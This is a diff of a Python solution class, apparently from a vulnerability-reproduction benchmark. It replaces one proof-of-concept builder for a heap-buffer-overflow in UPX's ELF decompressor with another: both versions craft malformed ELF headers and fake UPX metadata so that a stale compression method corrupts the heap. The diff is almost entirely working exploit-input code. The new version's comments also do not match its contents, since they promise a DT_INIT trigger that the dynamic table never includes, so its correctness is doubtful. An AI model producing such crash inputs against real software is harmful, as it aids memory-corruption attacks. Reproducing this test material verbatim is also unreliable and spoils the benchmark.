@@ -11,67 +11,123 @@ class Solution:
         Returns:
             bytes: The PoC input that should trigger the vulnerability
         """
-        # The vulnerability is a heap-buffer-overflow in UPX's ELF decompressor due to
-        # an un-reset state variable (`ph.method`) when iterating program headers.
-        # This PoC creates a minimal 32-bit ELF file with two program headers.
-        # 1. A PT_LOAD header points to a fake UPX metadata block, which sets
-        #    `ph.method` to a non-zero value (e.g., 8 for LZMA).
-        # 2. A PT_DYNAMIC header is processed next. The vulnerable UPX version uses the
-        #    stale `ph.method`. This header contains a DT_INIT entry, triggering
-        #    `un_DT_INIT()`, which then attempts to decompress data using the wrong
-        #    method, causing the overflow.
+        poc = bytearray(512)
 
-        # ELF Header (32-bit, little-endian)
-        ehdr = b'\x7fELF\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00' # e_ident
-        ehdr += struct.pack(
-            '<HHIIIIIHHHHHH',
+        # Elf64_Ehdr (64 bytes at offset 0)
+        # Type: DYN (Shared object file)
+        # Machine: x86-64
+        poc[0:64] = struct.pack(
+            "<16sHHIIQQQIHHHHHH",
+            b"\x7fELF\x02\x01\x01" + b"\x00" * 9,  # e_ident
             3,      # e_type = ET_DYN
-            3,      # e_machine = EM_386
+            62,     # e_machine = EM_X86_64
             1,      # e_version
-            0,      # e_entry
-            52,     # e_phoff
+            0x400180, # e_entry (points into the first LOAD segment)
+            64,     # e_phoff
             0,      # e_shoff
             0,      # e_flags
-            52,     # e_ehsize
-            32,     # e_phentsize
-            2,      # e_phnum
+            64,     # e_ehsize
+            56,     # e_phentsize
+            3,      # e_phnum
             0,      # e_shentsize
             0,      # e_shnum
             0       # e_shstrndx
         )
 
-        # Offsets and sizes
-        ehdr_size = 52
-        phdr_table_size = 2 * 32
-        
-        # Program Header 1 (PT_LOAD to set the stale compression method state)
-        p_offset1 = ehdr_size + phdr_table_size
-        p_filesz1 = 36  # Size of the fake UPX block
-        phdr1 = struct.pack(
-            '<IIIIIIII',
-            1, p_offset1, 0, 0, p_filesz1, p_filesz1, 5, 0x1000
+        # Program Headers (3 * 56 = 168 bytes at offset 64)
+
+        # PHDR 0: LOAD R+X segment for UPX stub and metadata.
+        poc[64:120] = struct.pack(
+            "<IIQQQQQQ",
+            1,      # p_type = PT_LOAD
+            5,      # p_flags = R+X
+            0,      # p_offset
+            0x400000, # p_vaddr
+            0x400000, # p_paddr
+            len(poc), # p_filesz
+            0x8000,   # p_memsz
+            0x1000    # p_align
         )
 
-        # Program Header 2 (PT_DYNAMIC to trigger the vulnerability)
-        p_offset2 = p_offset1 + p_filesz1
-        p_filesz2 = 16  # Two Elf32_Dyn entries
-        phdr2 = struct.pack(
-            '<IIIIIIII',
-            2, p_offset2, 0x1000, 0x1000, p_filesz2, p_filesz2, 6, 4
+        # PHDR 1: LOAD R+W segment. This is the target for the heap overflow.
+        poc[120:176] = struct.pack(
+            "<IIQQQQQQ",
+            1,      # p_type = PT_LOAD
+            6,      # p_flags = R+W
+            0,      # p_offset
+            0x408000, # p_vaddr
+            0x408000, # p_paddr
+            0,      # p_filesz
+            0x10,   # p_memsz (small buffer to overflow)
+            0x1000    # p_align
         )
+
+        # PHDR 2: DYNAMIC segment, to trigger un_DT_INIT code path.
+        dynamic_table_file_offset = 0x180
+        poc[176:232] = struct.pack(
+            "<IIQQQQQQ",
+            2,      # p_type = PT_DYNAMIC
+            6,      # p_flags = R+W
+            dynamic_table_file_offset, # p_offset
+            0x409000, # p_vaddr
+            0x409000, # p_paddr
+            16,     # p_filesz (one DT_NULL entry)
+            16,     # p_memsz
+            8       # p_align
+        )
+
+        # Minimal dynamic table with a DT_NULL entry.
+        poc[dynamic_table_file_offset:dynamic_table_file_offset+16] = struct.pack("<QQ", 0, 0)
+
+        # UPX data structures, placed near the end of the file.
+        l_info_file_offset = 496
+        b_info_file_offset = l_info_file_offset - 24
+        p_info_file_offset = b_info_file_offset - 16
+        data_file_offset = p_info_file_offset - 16
+
+        # l_info: Main info struct for UPX.
+        poc[l_info_file_offset:l_info_file_offset+16] = struct.pack(
+            "<IiiI",
+            0,                                          # l_checksum
+            p_info_file_offset - l_info_file_offset,    # p_info offset
+            b_info_file_offset - l_info_file_offset,    # b_info offset
+            512                                         # l_filesize
+        )
+
+        # b_info: Describes the compressed blocks.
+        # Block 0: Sets the decompressor method to LZMA (8).
+        poc[b_info_file_offset:b_info_file_offset+12] = struct.pack(
+            "<III",
+            0x1000, # u_len (uncompressed size)
+            8,      # c_len (compressed size)
+            8       # b_method = LZMA
+        )
+        # Block 1: Is supposed to be a copy (1), but will be processed with LZMA.
+        poc[b_info_file_offset+12:b_info_file_offset+24] = struct.pack(
+            "<III",
+            0x10,   # u_len
+            8,      # c_len
+            1       # b_method = COPY
+        )
+
+        # p_info: Maps blocks to program headers.
+        # p_info[0] corresponds to b_info[0]
+        poc[p_info_file_offset:p_info_file_offset+8] = struct.pack(
+            "<II",
+            0x40A000, # p_va (dummy virtual address)
+            0x1000    # p_size (matches b_info[0].u_len)
+        )
+        # p_info[1] corresponds to b_info[1] and PHDR 1 (the target)
+        poc[p_info_file_offset+8:p_info_file_offset+16] = struct.pack(
+            "<II",
+            0x408000, # p_va (matches PHDR 1 vaddr)
+            0x10      # p_size (matches b_info[1].u_len and PHDR 1 memsz)
+        )
+
+        # "Compressed" data payload.
+        # Data for b_info[0]. Content doesn't matter.
+        poc[data_file_offset:data_file_offset+8] = b"A" * 8
+        # Data for b_info[1]. This payload causes the overflow when parsed as LZMA.
+        poc[data_file_offset+8:data_file_offset+16] = b"\x00" * 8
         
-        phdr_table = phdr1 + phdr2
-
-        # Data for Phdr 1: Fake UPX metadata block.
-        # Sets b_method to 8. b_info layout: b_usize, b_csize, b_method, b_level.
-        data1 = b'UPX!'
-        data1 += b'\x00' * 12                      # l_info
-        data1 += struct.pack('<IIII', 0, 0, 8, 0)  # b_info
-        data1 += b'\x00' * 4                       # pack_info
-
-        # Data for Phdr 2: Minimal dynamic section to trigger un_DT_INIT().
-        # Contains a DT_INIT entry (tag=12) and a terminating DT_NULL (tag=0).
-        data2 = struct.pack('<II', 12, 0xdeadbeef) + struct.pack('<II', 0, 0)
-
-        # Assemble the final PoC file
-        return ehdr + phdr_table + data1 + data2
+        return bytes(poc)
